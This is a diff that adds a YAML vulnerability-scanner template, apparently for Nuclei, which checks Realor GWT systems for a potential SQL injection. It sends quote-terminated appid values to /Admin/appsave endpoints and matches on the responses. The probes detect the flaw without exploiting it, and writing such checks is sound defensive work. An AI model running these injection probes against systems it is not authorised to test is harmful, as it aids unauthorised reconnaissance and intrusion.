@@ -1,0 +1,37 @@
+id: yaml-poc-realor-gwt-system-sql-injection-CT-1251010
+info:
+  name: "Potential SQL Injection in Realor GWT System"
+  author: "yuxiang.cai"
+  severity: "critical"
+  description: |
+    Potential SQL Injection vulnerability in the Realor GWT system detected via specific paths and payloads.
+http:
+  - name: "check-think_language"
+    method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=/Admin/appsave&appid=3'"
+      - "{{BaseURL}}/hmrao.php?s=/Admin/appsave&appid=3'"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: header
+        words:
+          - "think_language"
+
+  - name: "check-appInfo"
+    method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=/Admin/appsave&appid=3'-"
+      - "{{BaseURL}}/hmrao.php?s=/Admin/appsave&appid=3'-"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "appInfo"
